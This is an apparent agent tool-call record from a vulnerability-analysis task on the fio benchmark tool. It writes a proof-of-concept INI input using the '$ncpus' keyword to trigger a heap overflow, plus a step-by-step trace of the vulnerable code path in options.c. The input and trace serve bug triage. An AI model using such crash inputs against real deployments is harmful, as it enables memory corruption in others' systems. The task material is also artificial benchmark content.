message:
Command `cd /workspace/repo-vul/src-vul/fio && python3 - <<'PY'
from pathlib import Path
p=Path('poc5.bin')
# try exact vulnerable pattern from issue description with option prefix and section name
p.write_bytes(b'[global]\ndescription=$ncpus\n[job1]\ndescription=$ncpus\n')
print(p.resolve(), p.stat().st_size)
PY
cat > /workspace/candidate_trace.json <<'JSON'
[
  {"step":1,"file":"init.c","function":"__parse_jobs_ini","line":1944,"var":"p","code":"p = fgets(string, OPT_LEN_MAX, f);","note":"The parser reads the attacker-controlled INI job text from the input buffer."},
  {"step":2,"file":"init.c","function":"__parse_jobs_ini","line":2065,"var":"opts[num_opts]","code":"opts[num_opts] = strdup(p);","note":"Each option line, including description=$ncpus, is copied into the per-job option list."},
  {"step":3,"file":"options.c","function":"fio_options_parse","line":5195,"var":"opts_copy","code":"opts_copy = dup_and_sub_options(opts, num_opts);","note":"The option strings are duplicated so keyword substitution can modify them safely in theory."},
  {"step":4,"file":"options.c","function":"dup_and_sub_options","line":5147,"var":"opts_copy[i]","code":"opts_copy[i] = fio_option_dup_subs(opts[i]);","note":"Environment-variable substitution is applied before reserved-keyword substitution."},
  {"step":5,"file":"options.c","function":"fio_keyword_replace","line":5101,"var":"s","code":"while ((s = strstr(opt, kw->word)) != NULL) {","note":"The $ncpus keyword is found inside the attacker-supplied description string."},
  {"step":6,"file":"options.c","function":"fio_keyword_replace","line":5104,"var":"new","code":"char *new = calloc(strlen(opt) + 1, 1);","note":"A new heap buffer is allocated based on the current string length before splicing."},
  {"step":7,"file":"options.c","function":"fio_keyword_replace","line":5121,"var":"memcpy(new + olen + len, opt, opt - o_org - 1);","code":"if (strlen(opt)) memcpy(new + olen + len, opt, opt - o_org - 1);","note":"The tail-copy length is derived from a shifted source pointer and can exceed the remaining source bytes, producing the heap overflow in the keyword replacement routine."},
  {"step":8,"file":"options.c","function":"fio_options_parse","line":5200,"var":"parse_option(...)","code":"parse_option(opts_copy[i], opts[i], fio_options, &o, &td->o, &td->opt_list);","note":"The corrupted substituted option string is then handed to the option parser."}
]
JSON
ls -l poc5.bin /workspace/candidate_trace.json && cat /workspace/candidate_trace.json` executed with exit code 0.
